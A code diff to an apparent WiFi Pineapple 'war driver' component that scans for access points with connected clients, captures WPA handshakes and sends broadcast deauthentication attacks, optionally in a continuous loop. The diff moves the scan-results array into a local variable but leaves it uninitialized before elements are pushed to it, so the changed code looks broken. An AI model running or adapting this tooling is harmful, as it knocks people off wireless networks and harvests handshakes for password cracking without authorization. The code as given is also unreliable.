@@ -15,9 +15,8 @@ export class WarDriverComponent implements OnInit {
     statusHeader: string = '';
     statusFileName: string = '';
     json_frontend: StatusRootObject;
-    scanResultsArray: APResult[];
     continousDeauth: boolean = false;
-
+    
     populateTargetBSSIDs(): void {
         this.API.APIGet('/api/pineap/ssids', (resp) => {
             this.apiResponse = resp.ssids;
@@ -51,10 +50,10 @@ export class WarDriverComponent implements OnInit {
         this.get_status_file(statusFileName);
         //this.render_status();
     }
-    attackd(): void {
+    attackd(scanResultsArray: APResult[]): void {
         this.API.APIGet('/api/pineap/handshakes', (resp) => {  // start handshake capture
             if (resp.handshakes != null) {
-                this.scanResultsArray.forEach(ap => { // loop through APs
+                scanResultsArray.forEach(ap => { // loop through APs
                     let ap_deauth_payload = { // build ap deauth payload
                         bssid: ap.bssid,
                         multiplier: 1,
@@ -97,7 +96,7 @@ export class WarDriverComponent implements OnInit {
             });
         }, 20000);    
         if (this.continousDeauth) {
-            this.attackd();
+            this.attackd(scanResultsArray);
         }
     }
     
@@ -128,8 +127,8 @@ export class WarDriverComponent implements OnInit {
                 'target_mac': 'FF:FF:FF:FF:FF:FF' 
             }
         }
-        
-        
+        let scanResultsArray: APResult[];
+
         this.API.APIPut('/api/pineap/settings', pineAP_aggro_settings, (resp) => {
             this.API.APIPost('/api/recon/stop', null, (resp) => {
                 this.API.APIPost('/api/recon/start', scan_opts, (resp) => {
@@ -142,7 +141,7 @@ export class WarDriverComponent implements OnInit {
                                 if (ap.clients != null) {
                                     ap.clients.forEach(client => {
                                         console.log('>client found!: ' + client.client_mac);
-                                        this.scanResultsArray.push(ap);
+                                        scanResultsArray.push(ap);
                                     });
                                 }
                                 else { console.log('>AP found, but not with associated clients'); }
@@ -151,7 +150,7 @@ export class WarDriverComponent implements OnInit {
                         else { console.log('>no APs found'); }
                         
                         this.API.APIPost('/api/recon/stop', null, (resp) => { 
-                            if (this.scanResultsArray != null) this.attackd()
+                            if (scanResultsArray != null) this.attackd(scanResultsArray);
                             else console.log('>sorry, nothing to attack');
                         });
                     })}, 120000);
